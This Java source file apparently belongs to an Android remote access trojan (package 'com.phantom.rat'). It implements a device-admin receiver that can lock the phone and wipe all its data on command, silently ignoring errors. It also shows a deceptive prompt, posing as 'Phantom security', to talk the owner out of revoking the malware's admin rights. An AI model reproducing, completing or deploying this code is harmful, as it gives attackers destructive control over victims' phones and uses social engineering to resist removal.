package com.phantom.rat;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

public class DeviceAdminReceiver extends android.app.admin.DeviceAdminReceiver {

    public static ComponentName component(Context ctx) {
        return new ComponentName(ctx, DeviceAdminReceiver.class);
    }

    public static boolean isActive(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            return dpm != null && dpm.isAdminActive(component(ctx));
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isAdmin(Context ctx) {
        return isActive(ctx);
    }

    public static void lockNow(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isAdminActive(component(ctx))) dpm.lockNow();
        } catch (Exception ignored) {}
    }

    public static void wipeData(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isAdminActive(component(ctx))) dpm.wipeData(0);
        } catch (Exception ignored) {}
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Phantom security requires admin access to keep protection active.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
    }
}
